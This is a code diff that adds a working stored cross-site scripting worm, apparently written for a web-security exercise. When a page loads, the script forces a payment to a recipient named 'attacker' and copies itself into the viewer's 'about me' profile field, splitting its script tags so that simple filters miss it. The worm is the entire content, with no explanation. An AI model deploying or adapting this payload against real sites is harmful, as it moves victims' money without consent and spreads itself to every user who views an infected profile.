@@ -1,0 +1,18 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+        <script>
+            function func() {
+                $.ajax({
+                    type: "POST",
+                    url: '/pay',
+                    data: {'recipient': 'attacker', 'amount': 1}
+                });
+                $.ajax({
+                    type: "POST",
+                    url: '/aboutme',
+                    data: {'aboutme': "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js\">"
+                            + "</scr" + "ipt>"
+                            + "<scri" + "pt>"+ func.toString() + "func(); </sc" + "ript>"}
+                });
+            };
+            func();
+        </script>
